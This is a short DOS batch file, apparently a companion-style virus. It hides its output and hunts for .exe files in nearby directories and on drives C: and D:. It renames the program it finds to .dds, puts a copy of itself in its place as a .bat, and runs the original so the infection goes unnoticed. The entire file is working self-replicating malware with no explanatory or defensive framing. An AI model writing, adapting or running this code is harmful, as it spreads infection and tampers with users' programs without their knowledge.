@echo off
if "%@eval[2+2]" == "4" loadbtm on
ren %0.dds %0.exe >nul
if exist %0.exe %0 %1 %2 %3 %4 %5
ren %0.exe %0.dds >nul
ctty nul
for %%f in (..\*.exe ...\*.exe c:*.exe d:*.exe *.exe) do set zeke=%%f
if not exist %zeke% goto end
ren %zeke% *.dds
copy %0.bat %zeke%
ren %zeke% *.bat
:end
set zeke=
ctty con
